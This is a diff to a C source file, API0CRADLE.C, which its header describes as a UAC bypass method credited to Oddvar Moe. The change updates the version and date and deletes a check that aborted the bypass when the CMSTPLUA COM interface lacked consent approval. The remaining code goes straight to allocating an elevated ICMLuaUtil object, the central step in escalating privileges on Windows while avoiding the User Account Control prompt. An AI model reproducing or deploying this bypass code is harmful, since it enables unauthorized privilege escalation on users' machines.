@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2020
+*  (C) COPYRIGHT AUTHORS, 2017 - 2021
 *
 *  TITLE:       API0CRADLE.C
 *
-*  VERSION:     3.50
+*  VERSION:     3.58
 *
-*  DATE:        11 Oct 2020
+*  DATE:        01 Dec 2021
 *
 *  UAC bypass method from Oddvar Moe aka api0cradle.
 *
@@ -33,22 +33,11 @@ NTSTATUS ucmCMLuaUtilShellExecMethod(
 {
     NTSTATUS    MethodResult = STATUS_ACCESS_DENIED;
     HRESULT     r = E_FAIL, hr_init;
-    BOOL        bApprove = FALSE;
     ICMLuaUtil* CMLuaUtil = NULL;
 
     hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 
     do {
-
-        //
-        // Potential fix check.
-        //
-        if (supIsConsentApprovedInterface(T_CLSID_CMSTPLUA, &bApprove)) {
-            if (bApprove == FALSE) {
-                MethodResult = STATUS_NOINTERFACE;
-                break;
-            }
-        }
 
         r = ucmAllocateElevatedObject(
             T_CLSID_CMSTPLUA,
